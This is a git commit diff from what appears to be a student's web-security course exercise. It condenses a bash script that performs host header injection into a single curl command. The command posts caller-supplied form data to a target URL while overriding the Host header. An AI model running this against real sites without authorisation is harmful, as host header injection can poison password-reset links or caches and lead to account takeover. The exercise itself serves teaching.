6a509b5d8c6c02b219c4d45324fe7ac15ba04350
camia97 <camilaabdala26@gmail.com>
2024-09-24 11:29:22 -0400

    change to 2 lines code

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,19 +1,2 @@
 #!/bin/bash
-
-# Validate right arguments
-if [ $# -ne 3 ]; then
-  echo "Uso: $0 NEW_HOST TARGET_URL FORM_DATA"
-  exit 1
-fi
-
-# Var arguments
-NEW_HOST="$1"
-TARGET_URL="$2"
-FORM_DATA="$3"
-
-# Use curl to send the new headline change
-curl -X POST "$TARGET_URL" \
-  -H "Host: $NEW_HOST" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  --data "$FORM_DATA"
-
+curl -X POST "$2" -H "Host: $1" -H "Content-Type: application/x-www-form-urlencoded" --data "$3"
